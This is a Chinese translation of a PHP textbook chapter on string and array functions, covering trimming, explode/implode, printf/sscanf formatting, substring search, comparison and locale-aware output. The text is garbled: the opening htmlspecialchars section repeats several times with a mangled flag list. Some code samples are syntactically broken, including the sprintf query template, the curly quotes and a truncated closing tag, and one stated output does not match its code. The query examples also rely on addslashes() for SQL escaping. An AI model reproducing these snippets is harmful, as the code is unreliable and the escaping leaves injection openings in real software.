  \n## 字符串处理\n\n`htmlspecialchars()` 的行为取决于：\n\n```php\nhtmlspecialchars(string arg\
  \ [, int flags])\n```\n\n`ENT_QUOTES`\n- `ENT_SUBSTITUTE`\n- `ENT_COMPAT`\n- `ENT_NO_`\
  \ 单引号和双引号被转换。`echo` 双引号被转换。`echo` 单引号和双引号被转换。任何类型的引号被转换。\n\n## 字符串处理\n\n`htmlspecialchars()`\
  \ 的行为取决于：\n\n```php\nhtmlspecialchars(string arg [, int flags])\n```\n\n`ENT_QUOTES`\n\
  - `ENT_SUBSTITUTE`\n- `ENT_COMPAT`\n- `ENT_NO_` 单引号和双引号被转换。`echo` 双引号被转换。`echo`\
  \ 单引号和双引号被转换。任何类型的引号被转换。\n\n## 字符串处理\n\n`htmlspecialchars()` 的行为取决于：\n\n```php\n\
  htmlspecialchars(string arg [, int flags])\n```\n\n`ENT_QUOTES`\n- `ENT_SUBSTITUTE`\n\
  - `ENT_COMPAT`\n- `ENT_NO_` 单引号和双引号被转换。`echo` 双引号被转换。`echo` 单引号和双引号被转换。任何类型的引号被转换。\n\
  \n## 字符串处理\n\n`htmlspecialchars()` 的行为取决于：\n\n```php\nhtmlspecialchars(string arg\
  \ [, int flags])\n```\n\n`ENT_QUOTES`\n- `ENT_SUBSTITUTE`\n- `ENT_COMPAT`\n- `ENT_NO_`\
  \ 单引号和双引号被转换。`echo` 双引号被转换。`echo` 单引号和双引号被转换。任何类型的引号被转换。\n\n## 字符串处理\n\n`htmlspecialchars()`\
  \ 的行为取决于：\n\n```php\nhtmlspecialchars(string arg [, int flags])\n```\n\n`ENT_QUOTES`\n\
  - `ENT_SUBSTITUTE`\n- `ENT_COMPAT`\n- `ENT_NO_` 单引号和双引号被转换。`echo` 双引号被转换。`echo`\
  \ 单引号和双引号被转换。任何类型的引号被转换。\n\n\n\n移除字符串开头或结尾的空格通常很有用。用户可能会输入额外的空格，或者在从数据库返回值时存在末尾空格。这些空格会改变两个字符串之间的比较结果。针对这些问题，有\
  \ trim 系列函数：\n\n- `string ltrim(string str [, string charlist])`\n\n`string rtrim(string\
  \ str [, string charlist])`\n\n`string trim(string str [, string charlist])`\n\n\
  `string chop(string str [, string charlist])`\n\n`ltrim()` 移除所有的开头空白字符（字符串前面的字符），而\
  \ `rtrim()` 移除所有的末尾空白字符（字符串结尾的字符）。`trim()` 则移除两者。表 5.3 列出了所有 trim 函数都视为空白的字符。（ASCII\
  \ 值以十进制和十六进制格式给出。）\n\n#### **表 5.3: 空白字符**\n\n| 字符 | 描述 | ASCII 值 |\n| :--- | :---\
  \ | :--- |\n| `\\n` | 换行（也称为换行符） | 10 (0x0A) |\n| `\\r` | 回车 | 13 (0x0D) |\n| `\\\
  t` | 水平制表 | 9 (0x09) |\n| `\\0` | 空字符 | 0 (0x00) |\n| `\\x0B` | 垂直制表 | 11 (0x0B)\
  \ |\n| 空格 | | 32 (0x20) |\n\n`chop()` 只是 `rtrim()` 的别名，意味着它们是同一个函数。列表 5.3 展示了各种\
  \ trim 函数。\n\n**列表 5.3: 各种方式修剪字符串**\n\n```html\n<html>\n<head>\n<title>Trim Functions</title>\n\
  </head>\n<body>\n<span style=\"font-family: courier;\">\nSTRINGS\n113\n<?php\n$user_name\
  \ = \"Trailing Spaces \";\n$password = \" Leading spaces\";\n$preferences = \" Trailing\
  \ and Leading Spaces \"; \n$user_agent = $HTTP_USER_AGENT . \"\\n\\n\\n \\t\\t \\\
  r\\r\";\n\nprint(\"$user_name\" . \"<br />\");\nprint(\"$password\" . \"<br />\"\
  );\nprint(\"$preferences\" . \"<br />\");\nprint(\"$user_agent\" . \"<br />\");\n\
  \n$user_name = chop($user_name);\n$password = ltrim($password);\n$preferences =\
  \ trim($preferences);\n$user_agent = trim($user_agent);\n\nprint(\"<br /><br /><br\
  \ />\");\nprint(\"$user_name\" . \"<br />\");\nprint(\"$password\" . \"<br />\"\
  );\nprint(\"$preferences\" . \"<br />\");\nprint(\"$user_agent\" . \"<br />\");\n\
  ?>\n</span>\n</body>\n</html>\n```\n\ntrim 系列还支持一个可选的第二个参数 `charlist`，它强制函数修剪第二个参数中提供的任何一个字符。`charlist`\
  \ 的内容可以是简单的字符串或字符字符范围；例如，若要从 `$str` 中仅修剪制表符和换行符，你可以写 `trim($str, \"\\t\\n\")`。\n\
  \n你也可以通过提供十六进制值来指定 `charlist` 中的字符，如下所示：`trim($str, \"\\x09\\x0a\")`。\n\n要修剪范围内的所有字符，请使用特殊范围指定符\
  \ `..`（两个点）。这将修剪指定符两侧之间的所有字符。例如，要移除 `0x00` 和 `0x20` 之间的所有字符，你可以写：`trim($str, \"\\\
  x00..\\x20\")`。\n\n*注意：charlist 功能是在 PHP 4.1.0 中引入的。*\n\n## 第 5 章：字符串与数组\n\n## 数组的合并与字符串的分割\n\
  \n`join` 和 `implode` 函数接收一个数组并用指定的分隔符将其内容连接在一起。`join` 是 `implode` 的别名，两者是完全相同的函数。`explode`\
  \ 函数根据分隔符将字符串拆分，并将字符串碎片作为数组返回。第四个函数 `split()` 允许使用正则表达式将字符串拆分为数组（我们稍后会详细介绍正则表达式）。\n\
  \n- `string join(string delimiter, array pieces)`\n- `string implode(string delimiter,\
  \ array pieces)`\n- `array explode(string delimiter, string str)`\n\n请考虑一下以下字符串：\n\
  `jeremy,allen,555 Someplace,Georgia,55555,555.555`\n\n现在你得到了一个包含一万多个用户的旧数据库导出文件，格式如上，而你只有一个小时的时间将这些数据存储到数据库中以便处理。如你所见，文件是用逗号分隔的，这意味着每个字段都由逗号分隔。实际字段中不允许存储逗号，因此你知道每条记录都以换行符结束。你如何可能赶上截止日期？列表\
  \ 5.4 可能向你展示如何实现。\n\n**列表 5.4: 分割字符串**\n\n```html\n<html>\n<head>\n<title>Explode</title>\n\
  </head>\n<body>\n<?php\n$raw_contact_data =\n\"jeremy,allen,555 Someplace,Georgia,55555,555.555\\\
  n\"\n. \"erin,johnson,1010 nodrive,wisconsin,9999\\n\"\n. \"chris,heber,555\";\n\
  \n$contact_records = explode(\"\\n\", $raw_contact_data);\nforeach($contact_records\
  \ as $person) {\n    $person_data = explode(\",\", $person);\n    /* 执行数据库插入 */\n\
  \    foreach($person_data as $contact_item) {\n        print($contact_item);\n \
  \   }\n    print(\"<br />\");\n}\n?>\n</body>\n</html>\n```\n\n在实际情况下，列表 5.4 的代码将涉及更多工作。假设我们需要反转数据的导入过程——将几千个用户导出为逗号分隔格式。幸运的是，PHP\
  \ 提供了 `implode()` 函数，它是 `explode()` 的相反。`implode()` 需要两个参数：第一个参数是用于连接数组元素的分隔符；第二个参数是需要连接的数组。\n\
  \n列表 5.5 展示了 `implode()` 函数的使用。这里的另一个巧妙技巧是使用 `str_replace()` 将所有换行符替换为 HTML 换行符，以便浏览器渲染。\n\
  \n*注意：我们可以使用 `nl2br()` 函数实现相同的功能，正如名称所示，它会将换行符转换为 `<br>` 标签，但我们认为演示 `str_replace()`。或者更高效的方法是直接在\
  \ `for` 循环的每个条目末尾添加 `<br>` 标签。*\n\n**列表 5.5: 合并数组**\n\n```html\n<html>\n<head>\n\
  <title>Implode</title>\n</head>\n<body>\n<?php\n$contact_data = Array();\n$contact_data[0][0]\
  \ = \"Jeremy\";\n$contact_data[0][1] = \"\";\n$contact_data[0][2] = \"Allen\";\n\
  $contact_data[0][3] = \"555 Someplace\";\n$contact_data[0][4] = \"Somecity\";\n\
  $contact_data[0][5] = \"Georgia\";\n$contact_data[0][6] = 55555;\n$contact_data[0][7]\
  \ = \"555.555.555\";\n\necho str_replace(\"\\n\", \"<br />\", implode(\",\", $contact_data[0]));\n\
  ?>\n</body>\n</html>\n```\n\n\n\n\n```php\n<?php\n$contact_data[1][7] = “”;\n$contact_data[2][0]\
  \ = “Chris”;\n$contact_data[2][1] = “”;\n$contact_data[2][2] = “Heber”;\n$contact_data[2][3]\
  \ = “555 Noplace”;\n$contact_data[2][4] = “Othercity”;\n$contact_data[2][5] = “Georgia”;\n\
  $contact_data[2][6] = 55555;\n$contact_data[2][7] = “555.555.5555”;\n$str_export_data\
  \ = “”;\nfor($i = 0; $i < count($contact_data); $i++)\n$str_export_data .= implode(“,”,\
  \ $contact_data[$i]) . “\\\\n”;\nprint(str_replace(“\\\\n”, “\\\\n<br />”, $str_export_data));\n\
  ?>\n```\n\n</body>\n</html\n\n我们定义了一个数组并在二维中存储数据。第一个维度代表数据库中的每条记录。第二个维度代表每个用户数据的特定元素。PHP\
  \ 可用的几乎每个数据库 API 都可以将数据库的一行作为数组返回，但对于数据库记录集，并不完全需要组装这种数据结构。只需遍历记录集，并将每行获取为数组就足够。\n\
  \n函数的核心部分发生在最后六行。首先，声明导出数据变量并赋值为空字符串。接着，启动一个 `for` 循环，对数组第一维中的每个键值对循环一次。在每次循环迭代中，将当前行的第二个维度进行\
  \ `implode` 处理，创建一个表示该行的字符串。该字符串使用连接赋值运算符（`.=`）进行拼接。会添加一个新行，以便每条记录以及每个单独的数据项都能被分隔。\n\
  \n在列表 5.5 的末尾，当打印字符串且仅用于显示时，每个新行都被替换为 `\\n<br />`，这样换行符将由浏览器渲染。`str_replace()` 比正则表达式要高效得多，当要替换的模式简单（例如单个换行符）时，应该使用它代替\
  \ `ereg_replace()` 或 `preg_replace()`。\n\n## 字符串\n117\n\n`str_replace()` 的原型如下：\n\
  \n`mixed str_replace(mixed search, mixed replace, mixed subject)`\n\n`join()` 函数只是\
  \ `implode()` 的别名。建议选择一个版本并保持一致使用，以提高代码质量。别名旨在帮助那些更习惯 Perl 中同名构造的人。\n\n#### 注意事项\n\
  另一个从 C 语言中借用的类似函数是 `strok()`，它使用用户定义的分隔符将字符串划分为标记（tokens）。例如，如果你使用空格字符作为分隔符对字符串“Pump\
  \ Up the Jam”进行分词，`strtok()` 将产生标记 Pump、Up、the 和 Jam。）可以使用空格作为分隔符对字符串进行“分词”，然后对每个单独的单词进行处理。`strtok()`\
  \ 返回一个字符串，在某些情况下，这比数组更理想。关于 `strtok()` 的更多信息，请参阅 PHP 在线文档 http://php.net/docs.php。\n\
  \n或者查看此光盘附带的文档。\n\n### 打印格式化字符串\nPHP 包含了强大的 `printf()` 和 `sprintf()` 函数，它们用于打印格式化字符串。这两个函数都直接源自\
  \ C 语言，其运行方式与在该语言中几乎相同。\n\n这些函数接受两个参数：一个包含特殊占位符和格式代码的“格式模板”，加上一个将放入占位符的任意长度参数列表。其原型为：\n\
  \n`void printf (string format [, mixed args\\])`\n`string sprintf (string format\\\
  [, mixed args\\])`\n\n`printf()` 函数实际上会将生成的字符串输出到浏览器；`sprintf()` 返回生成的字符串，而不向浏览器生成任何输出。\n\
  \n这些函数对于数据必须进行特殊格式化的复杂字符串，或者必须将长长的子字符串列表连接成更大的字符串的情况非常有用。数据库查询就是一个例子。例如，你可以使用字符串连接运算符生成一个发送到数据库的查询，但使用\
  \ `sprintf()` 通常更简单且更具可读性。使用前者策略，你可能会编写这样的代码：\n\n```php\n$query = “INSERT INTO users\
  \ (user_id, username, password, email, last_updated) “\n. “VALUES (“ . $uid . “,\
  \ ‘“ . addslashes ($username) . “‘, ‘“\n. md5 ($password) . “‘, “ . addslashes ($email)\
  \ . “‘)`;\n```\n\n虽然这种方法运行良好，但读写起来很繁琐（且更容易出错）。一种更优雅的方法是使用 `sprintf()` 来生成 `$query`，如下：\n\
  \n```php\n$template = “INSERT INTO users (user_id, username, password, email, last_updated)\
  \ “\n. “VALUES (%d, ‘%s’, ‘%s’, ‘%s’, NOW())”\n. . md5 ($password) . “‘, “\n. addslashes\
  \ ($email) . “‘)”;\n$query = sprintf ($template, $uid, addslashes ($username), md5\
  \ ($password), addslashes ($email));\n```\n\n118\n\n# 第 5 章\n 字符串与数组\n\n#### 注意事项\n\
  `addslashes()` 函数确保任何单引号都被转义；`printf()` 和 `sprintf()` 的格式模板由字面文本、格式占位符组成：\n\n1.\
  \ **填充（Padding）**：可以是空格（ ”）或 0，用于填充输入。默认不使用填充。\n2. **对齐（Alignment）**：指示输入是右对齐还是左对齐（也就是说，决定填充哪侧）。默认是右对齐。\n\
  3. **宽度（Width）**：给出输入的最小宽度。（例如，如果宽度为 5，结果将是 00044。）\n4. **精度（Precision）**：控制浮点数显示的位数。例如，如果精度为\
  \ 2，输入为 4.329，输出将为 4.32。\n5. **类型（Type）**：决定输入如何被处理和呈现。类型占位符的合法值见表 5.4。\n\n表 5.4：printf()\
  \ 和 sprintf 的类型占位符\n\n| 占位符 | 输入类型 | 输出格式 |\n| :--- | :--- | :--- |\n| b | 整数 |\
  \ 二进制数 |\n| C | 整数 | 单个字符 |\n| D | 整数 | 有符号十进制数 |\n| U | 整数 | 无符号十进制数 |\n| F | 浮点数\
  \ | 浮点数 |\n| O | 整数 | 八进制数 |\n| S | 字符串 | 字符串 |\n| x | 整数 | 小写字母十六进制数 |\n| X | 整数\
  \ | 大写字母十六进制数 |\n\n字符串\n119\n\n以下是使用各种常用格式占位符的 `printf()` 示例：\n\n```php\n<?php\n\
  printf (“数字 %d 的字符值是 %c\\n”, 72, 72);\nprintf (“用 %.2f 控制 %f 中的小数位数\\n”, 5.1234,\
  \ 5.1234);\nprintf (“我们也可以用 0 左填充数字：%05f\\n”, 33.22);\nprintf (“或者我们可以左填充数字并指定精度：%05.2f\\\
  n”, 33.22);\nprintf (“%d 的十六进制表示是 %x\\n”, 92, 92);\nprintf (“...但你也可以写成 %X\\n”,\
  \ 92);\nprintf (“（如果你好奇，它的八进制表示是 %o)\\n”, 92);\nprintf (“用连字符左填充字符串 %s，像这样：%%-6s\\\
  n”, ‘foo’, ‘foo’);\nprintf (“...现在让我们用连字符右填充它：%’--6s\\n”, ‘foo’, ‘foo’);\n?>\n```\n\
  \n\n\n\n前面的代码段将生成以下输出：\n\n72 的字符值为 H\n\n通过 5.12 控制 5.123400 的小数位数\n\n我们还可以对数字进行左侧补零：00033.220000\n\
  \n或者我们可以对一个数字进行左侧填充并指定精度：00033.22\n\n92 的十六进制表示为 5c\n\n... 但你也可以将其写为 5C\n\n（如果你好奇的话，它的八进制表示是\
  \ 134）\n\n用连字符对字符串 foo 进行左填充，如下：---foo\n\n... 现在让我们用连字符对其进行右填充：foo---\n\n除了 `printf()`\
  \ 和 `sprintf()` 之外，PHP 还提供了内置函数 `vprintf()` 和 `vsprintf()`。它们的工作方式与 `printf()` 和\
  \ `sprintf()` 完全相同，但它们接受的不是任意长度的参数列表，而是一个包含所有要插值到格式模板中的值的单一数组。它们的原型如下：\n\n`void\
  \ vprintf (string format, array args)`\n\n`string vsprintf (string format, array\
  \ args)`\n\n最后，还有 `sscanf()`，你可以将其认为是 `sprintf()` 的反向操作。它不是将值插值到格式模板中并返回生成的字符串，而是使用\
  \ `sscanf()` 使用格式模板从字符串中*提取*值。`sscanf()` 的原型为 `mixed sscanf ( string str, string\
  \ format \\[, string var1\\])`。\n\n例如，假设我们需要处理一个包含联系信息的文本文件 `c:\\contacts.txt`，其中每行包含单条记录，如下所示：\n\
  \n`1\\tJeremy\\tAllen\\tTel: 761.555.3198\\tEmail: jallen@example.com`\n\n`2\\tSuzie\\\
  tBertolucci\\tTel: 672.555.1234\\tEmail: suzieq@example.org`\n\n...\n\n（每个 `\\t`\
  \ 是源文件中的字面制表符。）我们可以通过以下代码段来实现它：\n\n```php\n$fp = fopen (‘c:\\contacts.txt’, ‘r’);\n\
  ```\n\n# 第 5 章\n\n## 字符串与数组\n\n```php\nwhile (!feof ($fp)) {\n    $input = fgets\
  \ ($fp, 1024);\n    $contact_info = sscanf ($input, “%d\\t%s\\t%s\\tTel: %s\\tEmail:\
  \ %s\\n”);\n    $contact_id = $contact_info[0];\n    $firstname = $contact_info[1];\n\
  \    $lastname = $contact_info[2];\n    $telephone = $contact_info[3];\n    $email\
  \ = $contact_info[4];\n}\nfclose ($fp);\n```\n\n`sscanf()` 还可以接收一个额外的变量列表（作为第三、第四等参数），在这种情况下，它将将提取的值放入这些变量中，而不是以数组的形式返回提取的值。因此，我们可以将上述加粗的几行合并为一行，如下：`sscanf($input,\
  \ “%d\\t%s\\t%s\\tTel: %s\\tEmail: %s\\n”, $contact_id, $firstname, $lastname, $telephone,\
  \ $email);`\n\n当然，我们可以使用赋值来完成相同的操作：\n\n```php\nlist($contact_id, $firstname, $lastname,\
  \ $telephone, $email) =\nsscanf ($input, “%d\\t%s\\t%s\\tTel: %s\\tEmail: %s\\n”);\n\
  ```\n\n*注意*\n\n*`sscanf()` 匹配源文本模式的方式可能会很复杂；例如，`%s` 类型说明符将匹配任何字母数字或标点字符，这意味着如果源文本使用（例如）逗号作为字段符（如前面的列表\
  \ 5.4 所示），你就无法用它从源文本中提取字符串值。此外，由于 `%s` 不匹配空格，你无法用它来提取包含空格的字符串（它只会匹配到第一个空格字符之前的字符串部分，并且你的格式模板中的后续说明符可能无法产生匹配）。*\n\
  \n## 数字格式化\n\n每当存储货币值时，它们通常不是以带有美元符号的字符串存储；而是以浮点数的形式存储。可以使用 `number_format()` 函数来控制数字的格式化，通常是在显示数字时。虽然\
  \ `number_format()` 本身不是一个字符串函数，但它仍然与字符串和字符串格式化密切相关，因为它返回一个字符串，因此经常用作输出活动（如 print）的一部分。\n\
  \n`number_format()` 函数接受四个参数：\n\n`string number_format(float number, int decimals,\
  \ string dec_point, string thousands_sep)`\n\n| 参数 |  |\n| :--- | :--- |\n| *number*\
  \ | 要格式化的数字 |\n| *decimals* | 精度——即要格式化的小数位数 |\n| *dec_point* | 用于小数点的字符串（在北美，通常是点号）\
  \ |\n| *thousands_sep* | 用于分隔千位组的字符串（在北美，通常是逗号） |\n\n下面的示例显示了如何使用 `number_format()`\
  \ 格式化金额。\n\n```php\n<?php\n$shoe_price = 49.9500001;\nprint($shoe_price . “\\n”);\n\
  print(“\\$” . number_format($shoe_price, 2, “.”, “,”));\n?>\n```\n\n此片段产生：49.95\n\
  \n## 获取字符串长度\n\n`strlen()` 函数的作用正如你预期：它计算字符串中的字符数量。它接受一个参数——你想要计数的字符串——并返回一个整数。原型为\n\
  \n`int strlen (string)`\n\n通常，`strlen()` 会与其他字符串函数配合使用。\n\n### 在字符串中查找子字符串\n\n你执行的最常见的字符串任务之一是在较大的字符串中搜索特定的子字符串。虽然正则表达式函数（在本章后面介绍）可以用于此目的，但内置函数通常更高效。检查这些字符串时非常有用的函数是\
  \ `strstr()`（以及它的朋友 `stristr()` 和 `strrchr()`）。`strstr()` 函数检查一个字符串中是否存在另一个字符串，并返回从匹配处到结尾的字符串部分（如果没有找到匹配，则返回\
  \ False）。PHP 文档描述得很好：“返回 *haystack* 中从 *needle* 第一次出现到结尾的所有内容。”换句话说，我们正在草堆中寻找针。\n\
  \n我们可以使用 `strstr()` 来测试“Mozilla”是否存在：`$has_moz = strstr($_SERVER['HTTP_USER_AGENT'],\
  \ ‘Mozilla’) ? TRUE : FALSE;` 如果我们，我们甚至可以测试“Mozilla”是否出现在字符串的*开头*，如下：\n\n```php\n\
  $ua = $_SERVER['HTTP_USER_AGENT']; // 节省输入时间\n```\n\n\n\n\n```\n$has_moz = strstr\
  \ ($ua, ‘Mozilla’) == $ua ? TRUE : FALSE;\n```\n\n`stristr()` 函数执行相同的操作，但它是不区分大小写的匹配，而\
  \ `strrchr()` 函数则从右到左进行搜索。它的原型定义为 `string strrchr (string haystack, string needle)`。\n\
  \n它返回从 `haystack` 中 `needle` *最后*一次出现的位置到开头的所有内容。\n\n`strchr()` 函数仅仅是 `strstr()`\
  \ 的别名；你可以使用任何你认为更容易记忆或视觉上更舒服的名字。\n\n另一对类似的函数是 `strpos()` 和 `strrpos()`，它们用于在字符串中查找子字符串或字符的位置。`strpos()`\
  \ 找到子字符串第一次出现的位置，而 `strrpos()` 找到字符最后一次出现的位置。它们的原型定义为 `int strpos (string haystack,\
  \ string needle[, int offset])` 和 `int strrpos (string haystack, char needle)`。\n\
  \n你可以使用可选的第三个参数 `offset` 告诉 `strpos()` 从字符串的指定部分开始搜索。关于这些函数有三点需要注意：\n\n- 首先，字符的位置编号是从\
  \ 0 开始的，而不是 1。\n- 第二，如果没有找到子字符串/字符，它们将返回 `False`。但是，如果子字符串/字符位于字符串的开头，它们将返回 0，表示它位于位置\
  \ 0。因此，你必须使用恒等运算符 `===` 来检查返回值。\n- 第三，PHP 中实际上没有所谓的“char（字符）”数据类型；你实际上传递的是一个字符串给\
  \ `strrpos()`。然而，`strrpos()` 只会使用作为第二个参数传递的字符串的第一个字符，所以如果你调用 `strrpos (‘riddle’,\
  \ ‘dd’`，它将返回 2。\n\n# 字符串 (STRINGS)\n\n 123（注：此处为原文中的页码）\n\n最后，是 `substr()` 函数，你可以用它从字符串中提取特定编号的字符序列。它的原型定义为\
  \ `string substr (string str, int start[, int length])`。\n\n因此 `substr (‘Cartier-Bresson’,\
  \ 0, 7)` 将返回字符串“Cartier”。再次注意，字符编号是从零开始的。第三个参数 `length` 是可选的，且默认为字符串的长度；因此 `substr\
  \ (‘foo’, 0)` 将返回“foo”（这完全是在浪费时间）。\n\n让我们把 `substr()` 和 `strpos()` 函数结合起来来看一个真实的示例。由于我们知道大多数用户代理（user-agent）标识字符串都以浏览器的名称和版本开头，用斜杠分隔并空格结尾，我们可以尝试通过以下代码段将这些值获取到本地变量中：\n\
  \n```php\n$ua = $_SERVER['HTTP_USER_AGENT`]; // 保存输入\n$space_pos = strpos ($ua,\
  \ ‘ ‘);\n$slash_pos = strpos ($ua, ‘/’);\n$browser = substr ($ua, 0, $slash_pos);\n\
  $version = substr ($ua, $slash_pos, $space_pos - $slash_pos);\n```\n\n## 比较字符串 (Comparing\
  \ Strings)\n\n虽然你通常可以依赖 `==` 运算符来判断两个字符串是否相等，但 PHP 提供了一组非常可靠的字符串比较函数，你可以用它们进行二进制安全的字符串比较，这意味着你*真的*知道两个字符串是否是完全相同的，而不仅仅是它们在\
  \ `==` 运算符看来*看起来*是相同的。\n\n`strcmp()` 和 `strcasecmp()` 函数的原型为：\n\n`int strcmp (string\
  \ str1, string str2)`\n`int strcasecmp (string str1, string str2)`\n\n这些函数在字符串相等时返回\
  \ 0；如果 `str1` “小于” `str2`，则返回负数；如果 `str1` “大于” `str2`，则返回正数。“小于”和“大于”意味着一个字符串在字母顺序上在另一个之前之后。正如你预期的，`strcmp()`\
  \ 执行区分大小写的比较，而 `strcasecmp()` 不区分大小写。\n\n**注意**\n你还可以使用 `strncmp()` 和 `strncasecmp()`\
  \ 限制比较的字符数量，它们接受第三个参数来指定从 `str1` 和 `str2` 开始头使用的字符数。\n\n你还可以使用 `strnatcmp()` 和 `strnatcasecmp()`\
  \ 对字符串进行“自然比较”，它们使用“自然顺序”算法来比较字母数字字符串。这在包含字母数字信息的字符串（如“listing1”、“listing20”、“Listing2”、“listing4”）需要按照人类的方式进行排序时非常有用。（计算机倾向于根据更简单的标准进行排序，因此它们会将之前的列表排序为：“Listing2”、“listing1”、“listing20”、“listing4”。）然而，最简单的方法是将要排序的字符串放入数组，然后使用\
  \ `natsort()` 或 `natcasesort()` 对数组进行排序；如果你使用这种技术，可能永远不需要 `strnatcmp()` 或 `strnatcasecmp()`。\n\
  \n 124（注：此处为原文中的页码）\n\n## 第章：字符串与数组 (STRINGS AND ARRAYS)\n\n### 处理非 ASCII 字符串：setlocale(),\
  \ strcoll(), localeconv(), strftime()\n\nPHP 中许多处理字符串函数的行为取决于被称为“当前语言设置（locale）”的东西。语言设置决定了用于字符串比较、排序、数字格式化等的字符集。大多数\
  \ Unix 服务器的默认语言设置通常设置为 C 或 POSIX，它们定义了基于 ASCII 字符集的约定。要查看大多数 Unix 上可用的语言设置，你只需检查\
  \ `/usr/share/locale` 的内容。\n\n每个目录对应一个双字母语言代码，可选跟着一个下划线和一个双字母的国家代码以指定该语言的变体。例如，这里是典型的语言设置的内容：\n\
  \n```bash\nls /usr/share/locale\n```\n\n*i18n* 是“国际化（internationalization）”一词常用的缩写。你可以使用\
  \ `setlocale()` 函数来修改它。使用的语言设置的具体名称取决于你所使用的平台，但大多数系统都提供了有用的“常用名称”，例如“french”，你可以用它来代替“fr_FR”（在\
  \ Unix 上）或“French_France.1250”（在 Windows 上）。\n\n\n\n\n你可以使用 `setlocale()` 来更改当前的区域设置（locale）或获取当前的设置。要获取当前设置，请将特殊字符串“0”（数字\
  \ 0）作为第二个参数。\n\n`setlocale()` 的第一个参数始终是一个类别（category），它可以是以下常量之一：`Constant`\n\n\
  ### 描述\n\n- `LC_ALL`: 所有信息\n- `LC_CTYPE`: 用于大小写转换的字符类型信息\n- `LC_COLLATE`: 用于字符串排序的信息\n\
  - `LC_MONETARY`: 用于显示货币值\n- `LC_NUMERIC`: 控制在显示数字时使用何种数字和小数分隔符\n- `LC_TIME`: 用于日期和时间格式化\n\
  \n要显示当前的区域设置信息，只需编写：\n\n```php\nprint setlocale (LC_ALL, ‘0’);\n```\n\n**126**\n\
  \n# 第 5 章\n\n## 字符串与数组\n\n要更改区域设置，只需传入区域设置的新名称：\n\n```php\nsetlocale (LC_ALL, ‘fr’);\n\
  ```\n\n如果你需要临时更改区域设置然后返回之前的区域设置，可以简单地这样做：\n\n```php\n$old_locale = setlocale (LC_ALL,\
  \ ‘0’);\nsetlocale (LC_ALL, ‘fr’);\n// ... 执行一些法语操作 ...\nsetlocale (LC_ALL, $old_locale);\n\
  ```\n\n一旦你更改了区域设置，就可以使用几个利用区域设置信息的专门函数。要获取有关当前区域设置的数字和货币格式规范的信息，请使用 `localeconv()`\
  \ 函数。例如，你可以写：\n\n```php\nsetlocale (LC_ALL, ‘fr’);\nprint_r (localeconv ());\n```\n\
  \n这将生成如下输出：\n\n```php\nArray\n(\n[decimal_point] => ,\n[thousands_sep] =>\n[int_curr_symbol]\
  \ => FRF\n[currency_symbol] => F\n[mon_decimal_point] => ,\n[mon_thousands_sep]\
  \ =>\n[positive_sign] =>\n[negative_sign] => -\n[int_frac_digits] => 2\n[frac_digits]\
  \ => 2\n[p_cs_precedes] => 0\n[p_sep_by_space] => 1\n[n_cs_precedes] => 0\n[n_sep_by_space]\
  \ => 1\n[p_sign_posn] => 1\n[n_sign_posn] => 1\n[grouping] => Array\n(\n)\n[mon_grouping]\
  \ => Array\n(\n[0] => 3\n[1] => 3\n)\n)\n```\n\n字符串\n\n127\n\n如果你需要排序非 ASCII 字符串，`strcoll()`\
  \ 函数至关重要。与 `strcmp()` 一一样，`strcoll()` 接受两个字符串作为输入 `str1` 和 `str2`，如果 `str1` 在字母顺序上于\
  \ `str2` 之前，返回负数；如果 `str1` 和 `str2` 相等，返回 0；如果 `str1` 在字母顺序上于 `str2` 之后，返回正数。例如，这里有一个函数可以根据用户指定的区域设置的排序规则对字符串数组进行排序：\n\
  \n```php\nfunction localsort ($strings, $locale = ‘’) {\n    $old_loc = setlocale\
  \ (LC_CTYPE, ‘0’);\n    if ($locale != ‘’) {\n        if (!setlocale (LC_CTYPE,\
  \ $locale))\n            return FALSE;\n    }\n    if (gettype ($strings) != ‘array’))\n\
  \        return FALSE;\n    usort ($strings, ‘strcoll’);\n    setlocale (LC_CTYPE,\
  \ $old_loc);\n    return $strings;\n}\n```\n\n我们使用了 `usort()` 函数通过用户定义的比较函数对数组 `$strings`\
  \ 进行排序；在这种情况下，我们只是告诉它使用 `strcoll()`。要查看 `usort()` 的完整用法，请参 http://www.php.net/manual/en/function.usort.php\n\
  \n最后，可能最有用的是，你可以使用 `strftime()` 函数输出符合当前区域设置的日期或时间版本。例如，以下代码段：\n\n```php\nprint\
  \ strftime (‘%c’) . “\\n”;\nsetlocale (LC_ALL, ‘french’) . “\\n”;\nprint strftime\
  \ (‘%c’) . “\\n”;\n```\n\n将生成如下输出（至少在 2002 年 2 月 7 日下午 4:07:33 是这样的）：Thu Feb 7 16:07:33\
  \ 2002\njeu 07 fév 2002 16:07:33 PST\n\n`strftime()` 函数接受两个参数：一个强制性的格式化字符串（类似于传递给\
  \ `printf()` 系列函数的字符串），以及一个由 `mktime()` 返回的可选时间戳。\n\n如果省略了时间戳，则使用当前时间。\n\n格式化字符串可能包含字面字符和表\
  \ 5.5 所示的“转换符”。\n\n**表 5.5：** `strftime()` 的格式转换符\n\n| 标识符 | 效果 |\n| :--- | :---\
  \ |\n| %a | 根据当前区域设置的缩写星期几。 |\n| %A | 根据当前区域设置的完整星期几。 |\n| %b | 根据当前区域设置的缩写月份。 |\n\
  \n*下页待续*\n\n128\n\n# 第 5 章\n\n## 字符串与数组\n\n**表 5.5：** `strftime()` 的格式转换符（续）\n\n\
  | 标识符 | 效果 |\n| :--- | :--- |\n| %B | 根据当前区域设置的完整月份。 |\n| %c | 当前区域设置的首选日期时间表示。\
  \ |\n| %C | 世纪数字（年份除以 100）。 |\n| %d | 日几的数字（范围 01-31）。 |\n| %D | 同 %m/%d/%y。 |\n\
  | %e | 日几的数字，前面带空格。 |\n| %g | 同 %G，但不包含世纪。 |\n| %h | 同 %b。 |\n| %H | 使用 24 小时制的数字（范围\
  \ 00-23）。 |\n| %I | 使用 12 小时制的数字（范围 01-12）。 |\n| %j | 年中的数字（范围 001-366）。 |\n| %m\
  \ | 月份的数字（范围 01-12）。 |\n| %M | 分钟的数字（范围 00-59）。 |\n| %n | 换行符。 |\n| %p | 根据给定时间的“am”或“pm”。\
  \ |\n| %r | a.m. 和 p.m. 格式的时间。 |\n| %R | 24 小时制的时间。 |\n| %S | 秒的数字（范围 00-60）。 |\n\
  | %t | 制表符。 |\n| %T | 当前时间，等同于 %H:%M:%S。 |\n| %u | 星期几的数字 [1,7]， 1 代表周一。 |\n| %U\
  \ | 以星期日为第一天的年份周数。 |\n| %V | ISO 8601:1988 周数，范围 01-53，其中第 1 周是包含至少四天的周，且以周一为第一天。\
